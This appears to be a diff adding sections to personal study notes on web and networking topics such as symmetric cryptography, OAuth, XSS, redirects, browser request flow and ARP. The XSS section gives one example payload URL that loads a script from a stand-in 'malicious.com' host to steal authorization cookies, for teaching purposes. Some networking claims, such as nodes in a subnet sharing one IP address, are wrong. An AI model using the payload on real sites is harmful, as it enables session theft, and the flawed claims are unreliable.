@@ -104,6 +104,10 @@ client->>CA: get list of public key
 
 asymmetric cryptography uses pairs of keys generated from a one way function such that only the private key can decrypt whatever is encrypted by the public key. for two party communication what could be done its where A's public key + B's private key forms a shared secret between A and B and vice versa. also its possible to sign a message with a private key, such that we could verify the integrity of the message with the corresponding public key.
 
+### 3.1 symmetric cryptography
+
+or secret key, which a single key is used to encrypt and decrypt a document. is faster than asymmetric cryptography however it is a challenge to pass the key around. commonly used algorithm includes DES and AES.
+
 ## 4. http post vs http get
 
 http post request are never cached, don't remain in browser history, cant be bookmarked and no data length restrictions, thus its highly advised to use post request to deal with sensitive data. get is only good for retrieving / requesting data. however post is not encrypted, thus it can be sniffed and intercepted, or leaked through logging. to avoid this use SSL / TLS to ensure encryption.
@@ -147,3 +151,71 @@ we can observed there is no fully stateful or stateless route, its a mixed betwe
 ## 9. tokens
 
 ## 10. OAuth
+
+(under redirect umbrella) open standard for access delegation, commonly used to grant user access to websites/application to access their information without giving passwords.
+
+## 11. HTTP version
+
+| http version | 
+HTTP 1.0/1.1/2.0
+
+## 12. maintaining HTTP connection
+
+## 13. XSS
+
+prerequisite: same origin policy, browser will not allow cross origin read or write to another website. the protocol, host and port are used to check for this matter.
+
+cross site scripting includes injection of any content. the injected content (client side script) is executed by other users, which allows attackers to bypass access controls eg same origin policy.
+
+a simple example, by exploiting url `http://site.com/search?q=cats<script src="http://malicious.com/malicious.js"></script>` which executes search (http request to server), then server returns the standard html respose together with the injected script tag. when browser renders the html, it can not distingush between the malicious tag and normal tags, which the malicious tag is executed. the script proceeds to make a copy of the user's authorization cookie and sends back to the attacker. such example is non-persistent type which is usually done through phishing emails. persistent type will stays on the website and steals all user's authorization cookie. DOM XSS is entirely on client side, which can think of injection to SPAs, and DOM change is detected and page get rendered/executed.
+
+to prevent XSS inputs must be sanitized, thus templating engines requires `safe` keyword when sending HTML contents and JS html sanitize libraries exists. also cookie's security is added to further mitigate XSS by tying cookie with IP address, can be potential exploited by NATed IP address/IP address fogery.
+
+## 14. sticky package
+
+## 15. forward and redirect
+
+redirect essentially two http request is been made.
+
+```mermaid
+sequenceDiagram
+    client->>host: get resource A
+    host->>client: 302 resource A at host2
+    client->>host2: get resource A
+    host2->>client: resource A
+```
+
+forward
+
+```mermaid
+sequenceDiagram
+    client->>host: get resource A
+    host->>host2: get resource A
+    host2->>host: resource A
+    host->>client: resource A
+```
+
+## 16. DNS
+
+## 17. Browser
+
+1. resolve URL's domain name into IP address using DNS
+2. establish TCP connection with target server
+3. make HTTP request
+4. target server handles the request and response with http message
+5. browser renders the http message
+
+## 18. Digital certificates and signs
+
+## 19. ARP
+
+mainly converts IP address to MAC address. in RFC1122 mention ARP within link layer without explictly placing it in that layer while newer editions associate it at the network layer. it communicated within boundaries of a single network and is never routed across internetworking nodes.
+
+1. within local network if host A is sending host B IP packet, host A check in its ARP cache if host B's IP and MAC address pair exists, if yes the MAC address is added to the header of the IP packet.
+2. if ARP cache could not find the pair, host A broadcasts an ARP request across the local network, once host B received it will send the paired information to A, A proceeds to cache it and sends the packet.
+3. if A and B are not in the same local network, the process is similar but through a router, and within A's ARP table it stores the router that links to B instead
+4. if router that A relies has no corresponding pair, A broadcast to the router and subsequently the router broadcast to other routers so on and so forth.
+
+## IP address and MAC address
+
+IP address can be think of as postal address, and MAC address can be think of as the actual receipient. having both resolves the problem where within a subnet all nodes shares the same IP address. network switch is responsible for transfering frames from a MAC address to another. router identifies IP address and transmit the packet to destination IP.
